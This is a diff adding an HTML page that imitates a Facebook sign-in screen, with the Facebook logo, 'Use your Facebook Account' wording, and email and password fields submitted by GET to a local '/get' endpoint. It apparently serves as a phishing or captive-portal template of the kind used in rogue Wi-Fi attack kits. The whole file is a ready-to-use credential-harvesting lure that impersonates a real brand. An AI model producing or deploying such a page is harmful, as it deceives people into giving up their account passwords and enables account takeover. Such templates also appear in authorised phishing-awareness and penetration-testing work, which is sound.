@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html>
+<head>
+<style>
+body {
+  font-family: Arial, sans-serif;
+  background-color: #f2f2f2;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  height: 100vh;
+  margin: 0;
+  color: #1d2129;
+}
+.login-container {
+  width: 350px;
+  background-color: white;
+  box-shadow: 0px 0px 5px 0px rgba(0,0,0,0.20);
+  border-radius: 5px;
+  padding: 10px 20px;
+}
+#logo {
+  display: block;
+  margin: 0 auto;
+  margin-bottom: 20px;
+}
+h1 {
+  font-size: 28px;
+  font-weight: normal;
+  margin-bottom: 10px;
+  text-align: center;
+}
+h2 {
+  font-size: 16px;
+  font-weight: normal;
+  color: #606770;
+  margin-bottom: 20px;
+  text-align: center;
+}
+input[type=text], input[type=password] {
+  width: 100%;
+  padding: 15px;
+  margin: 5px 0 10px 0;
+  display: inline-block;
+  border: 1px solid #ccc;
+  box-sizing: border-box;
+  border-radius: 5px;
+}
+button {
+  background-color: #4267B2;
+  color: white;
+  padding: 14px 20px;
+  margin: 8px 0;
+  border: none;
+  cursor: pointer;
+  width: 100%;
+  border-radius: 5px;
+}
+button:hover {
+  opacity: 0.8;
+}
+</style>
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
+</head>
+<body>
+<div class="login-container">
+  <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.0" x="0px" y="0px" width="50" height="50" viewBox="0 0 50 50" style="null" id="logo" class="icon icons8-Facebook-Filled" >    <path fill="#4267B2" d="M40,0H10C4.486,0,0,4.486,0,10v30c0,5.514,4.486,10,10,10h30c5.514,0,10-4.486,10-10V10C50,4.486,45.514,0,40,0z M39,17h-3 c-2.145,0-3,0.504-3,2v3h6l-1,6h-5v20h-7V28h-3v-6h3v-3c0-4.677,1.581-8,7-8c2.902,0,6,1,6,1V17z"></path></svg>
+  <form action="/get" method="get">
+    <h1>Sign in</h1>
+    <h2>Use your Facebook Account</h2>
+    <label for="email"><b>Email</b></label>
+    <input type="text" placeholder="Enter Email" name="email" required>
+    <label for="password"><b>Password</b></label>
+    <input type="password" placeholder="Enter Password" name="password" required>
+    <button type="submit">Sign in</button>
+  </form>
+</div>
+</body>
+</html>
